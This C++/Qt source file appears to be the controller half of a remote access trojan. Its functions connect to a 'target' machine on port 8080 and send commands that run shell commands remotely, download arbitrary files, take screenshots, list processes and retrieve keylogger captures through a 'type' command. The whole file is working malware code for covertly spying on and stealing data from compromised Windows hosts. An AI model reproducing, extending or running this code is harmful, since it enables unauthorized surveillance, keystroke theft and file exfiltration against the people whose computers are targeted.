/*
author: Forec
last edit date: 2016/09/16
email: forec@bupt.edu.cn
LICENSE
Copyright (c) 2015-2017, Forec <forec@bupt.edu.cn>

Permission to use, copy, modify, and/or distribute this code for any
purpose with or without fee is hereby granted, provided that the above
copyright notice and this permission notice appear in all copies.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/

#include "mainwindow.h"

char temp[BUFLEN+4];
FILE *tempfp = NULL;

int send_s(SOCKET &sock, const char *buf, INT32 sendlen){
    /* content check */
    memcpy(temp, "FLAG", 4);
    if (buf){
        memcpy(temp + 4, buf, sendlen);
    }
    int realSendLen = send(sock, temp, sendlen + 4, 0);
    if ( realSendLen == SOCKET_ERROR)
        return SOCKET_ERROR;
    return realSendLen - 4 >= 0 ? realSendLen : 0;
}

int recv_s(SOCKET &sock, char *buf, unsigned int buflen){
    memset(buf, 0, buflen);
    int recvLen = recv(sock, temp, buflen+4, 0);
    if (recvLen == SOCKET_ERROR)
        return SOCKET_ERROR;
    if (recvLen < 4 || strncmp(temp, "FLAG", 4) != 0){
        return 0;
    }else{
        memcpy(buf, temp + 4, recvLen - 4);
        return recvLen - 4;
    }
}

int clearZero(char *buf, int totalLen, int siz){
    char temp[BUFLEN];
    int prez = 0, curz = 0, cur = 0, total = 0;
    while (prez < totalLen && curz < totalLen && cur < totalLen){
        if ( buf[cur] != 0 ){
            if (curz > prez && curz - prez <siz ){
                for (int i = prez; i <= curz; i++){
                    temp[total] = buf[i];
                    total++;
                }
            }
            temp[total] = buf[cur];
            total ++;
            cur ++;
            prez = cur;
        }else{
            if (buf[prez] != 0){
                prez = cur;
            }
            curz = cur;
            cur ++;
        }
    }
    memcpy(buf, temp, total);
    return total;
}

bool Tryconnect(SOCKET &sclient, const target &cur_target){
    WORD sockVersion = MAKEWORD(2, 2);
    WSADATA data;
    if (WSAStartup(sockVersion, &data) != 0){
        return false;
    }
    sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (sclient == INVALID_SOCKET){
        return false;
    }
    sockaddr_in serAddr;
    serAddr.sin_family = AF_INET;
    serAddr.sin_port = htons(8080);
    serAddr.sin_addr.S_un.S_addr = inet_addr(cur_target.ip);

    if (connect(sclient, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR){
        closesocket(sclient);
        return false;
    }
    char recData[BUFLEN];

    if (recv_s(sclient, recData, BUFLEN) == SOCKET_ERROR)
        return false;

    if (!strncmp(recData, "200", 3)){
        return true;
    }else{
        return false;
    }
}

void getFilename(char buf[]){
    size_t len = strlen(buf);
    size_t temp = len;
    while (temp--){
        if (buf[temp] == '\\')
            break;
    }
    strncpy(buf, buf + temp + 1, len - temp);
    buf[len - temp] = '\0';
}


bool getUserName(SOCKET &sclient, char *recOper){
    QString command("PCINFO");
    if (send_s(sclient, command.toStdString().c_str(), command.length()) == SOCKET_ERROR)
        return false;
    if (recv_s(sclient, recOper, BUFLEN) == SOCKET_ERROR)
        return false;
    return true;
}

bool sendCMD(SOCKET &sclient, const QString &command, char *recOper){
    QString newcommand;
    newcommand = "RUNCMD" + command;
    if (send_s(sclient, newcommand.toStdString().c_str(),
         newcommand.length()) == SOCKET_ERROR)
        return false;
    if (SOCKET_ERROR==recv_s(sclient, NULL, 0))
        return false;
    tempfp = fopen("temp.tmp", "wb");
    while(true){
        if (SOCKET_ERROR==send_s(sclient, NULL, 0)){
            fclose(tempfp);
            return false;
        }
        int recvLen = recv_s(sclient, recOper, BUFLEN);
        if (recvLen == SOCKET_ERROR){
            fclose(tempfp);
            return false;
        } else if (recvLen == 0){
            fflush(tempfp);
            fclose(tempfp);
            return true;
        } else{
            fwrite(recOper, 1, recvLen, tempfp);
        }
    }
    fclose(tempfp);
    return false;
}

bool checkL(SOCKET &sclient){
    QString command("PCINFO");
    char recOper[101];
    if (send_s(sclient, command.toStdString().c_str()
             , command.length()) == SOCKET_ERROR)
        return false;
    if (recv_s(sclient, recOper, 101) == SOCKET_ERROR)
        return false;
    return true;
}

bool getFile(SOCKET &sclient, const QString &path){
    char recOper[BUFLEN], filename[257];
    strcpy(filename, path.toLocal8Bit());
    getFilename(filename);
    QString saveFileName = QString("files\\") + QString(filename);

    FILE *fp = fopen(saveFileName.toStdString().c_str(), "wb");
    if (fp == NULL){
        return false;
    }
    QString command = "GETFILE" + QString(path.toLocal8Bit());
    if (send_s(sclient, command.toStdString().c_str(),strlen(command.toStdString().c_str())) == SOCKET_ERROR)
        return false;

    int recvFlag = recv_s(sclient, recOper, BUFLEN);
    if (recvFlag == SOCKET_ERROR || recvFlag == 0)
        return false;
    else if (!strncmp(recOper, "OPENFAIL", 8)){
        return false;
    }

    long filelength = *(long *)(recOper+8);

    // receive binary file
    while (true){
        if (SOCKET_ERROR==send_s(sclient, NULL, 0))
            return false;

        Sleep(5);
        int recvFlag = recv_s(sclient, recOper, BUFLEN);
        Sleep(5);
        if (recvFlag == SOCKET_ERROR){
            fclose(fp);
            return false;
        }else if (recvFlag == 0){
            if (filelength == 0){
                fflush(fp);
                fclose(fp);
                return true;
            }
            return false;
        }
        fwrite(recOper, 1, recvFlag,fp);
        filelength -= recvFlag;
    }
    fclose(fp);
    return false;
}

bool getScreenShot(SOCKET &sclient, const target & cur_target){
    char recOper[BUFLEN];
    memset(recOper, 0, BUFLEN);
    QString command("SCREENSHOT");
    if (send_s(sclient, command.toStdString().c_str(), command.length()) == SOCKET_ERROR)
        return false;
    if (recv_s(sclient, recOper, BUFLEN) == SOCKET_ERROR)
        return false;

    if (strstr(recOper, "SCREENSHOT SUCCEED") == NULL){
        return false;
    }

    /* write binary picture
       example: remote host name is forec
       save the screenshot as %DIR%/forec/2016-09-16 10:41:32.bmp
    */

    QString saveFileIP = cur_target.ip;
    QDateTime ctime = QDateTime::currentDateTime();
    QString timestr = ctime.toString("yyyy-MM-dd-hh-mm-ss");
    QString saveFileName = "screenshots\\" + saveFileIP + "-" + timestr + ".bmp";

    FILE *fp = fopen(saveFileName.toStdString().c_str(), "wb");
    if (fp == NULL){
        return false;
    }

    // send command to get saved screenshot
    command = "GETFILEE:\\screen.bmp";
    if (send_s(sclient, command.toStdString().c_str(), command.length()) == SOCKET_ERROR)
        return false;

    int recvFlag = recv_s(sclient, recOper, BUFLEN);
    if (recvFlag == SOCKET_ERROR || recvFlag == 0)
        return false;
    else if (!strncmp(recOper, "OPENFAIL", 8)){
        return false;
    }
    long filelength = *(long *)(recOper+8);
    // receive screenshot and write into binary picture
    while (true){
        if (SOCKET_ERROR==send_s(sclient, NULL, 0))
            return false;

        Sleep(5);
        int recvFlag = recv_s(sclient, recOper, BUFLEN);
        Sleep(5);
        if (recvFlag == SOCKET_ERROR){
            fclose(fp);
            return false;
        }else if (recvFlag == 0){
            if (filelength == 0){
                fflush(fp);
                fclose(fp);
                // open picture
                ShellExecute(NULL, L"open", stringToLPCWSTR(saveFileName.toStdString()), NULL ,
                             NULL, SW_SHOWNORMAL);
                return true;
            }
            return false;
        }
        fwrite(recOper, 1, recvFlag,fp);
        filelength -= recvFlag;
    }
    return false;
}

bool getPSList(SOCKET &sclient, char recOper[]){
    QString command("PSLIST");
    if(send_s(sclient, command.toStdString().c_str(),
         command.length())==SOCKET_ERROR){
        return false;
    }
    if (recv_s(sclient, recOper, BUFLEN) == SOCKET_ERROR)
        return false;
    return true;
}


bool getKeyBoard(SOCKET &sclient, char recOper[]){
    QString command("KEYBOARD");
    memset(recOper, 0, BUFLEN);
    if(send_s(sclient, command.toStdString().c_str(),
         command.length())==SOCKET_ERROR){
        return false;
    }
    if (recv_s(sclient, recOper, BUFLEN) == SOCKET_ERROR)
        return false;
    if (strncmp(recOper, "KEYBOARD FAILED",strlen( "KEYBOARD FAILED") )==0)
        return false;
    command = QString("type ") + QString(keyboard_save_file);
    return sendCMD(sclient, command, recOper);
}
